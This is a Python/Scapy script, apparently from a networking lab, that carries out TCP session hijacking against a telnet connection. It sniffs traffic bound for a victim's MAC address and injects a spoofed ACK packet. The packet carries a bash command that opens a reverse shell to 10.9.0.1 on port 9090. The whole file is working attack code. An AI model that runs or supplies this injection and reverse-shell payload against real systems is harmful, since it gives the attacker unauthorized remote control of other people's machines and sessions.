from scapy.all import *

'''
We only care about TCP packets with no payload, because we always catch one with a payload
and one without. As Scapy is a bit slow, the acknowledge number is always wrong when we finally
send the spoof packet. This way, we always catch the latest packet. 
Nevertheless, this is not restrictively necessary.
'''
# Check AutoReverseShell.pcapng

def sessionHijackingFunc(pkt):
    if not pkt['TCP'].payload: 
        ip = IP(src=pkt['IP'].src, dst=pkt['IP'].dst)
        # len_pkt = 0 if not pkt['TCP'].payload else len(pkt['TCP'].payload.load)
        tcp = TCP(sport=pkt['TCP'].sport, dport=23, flags="A", seq=pkt['TCP'].seq, ack=pkt['TCP'].ack)
        data = "\r/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r" # The first \r, is for the previous command to finish.
        pkt = ip/tcp/data
        ls(pkt)
        send(pkt, verbose=0)

f = "tcp and ether dst 02:42:0a:09:00:05 and not ether src 02:42:fa:a7:22:45" # Different approach. Only sniff packets whose MAC address destination is the victim machine, excluding own generated packets.
pkt = sniff(iface="br-fa4ab2f34bed", filter=f, prn=sessionHijackingFunc)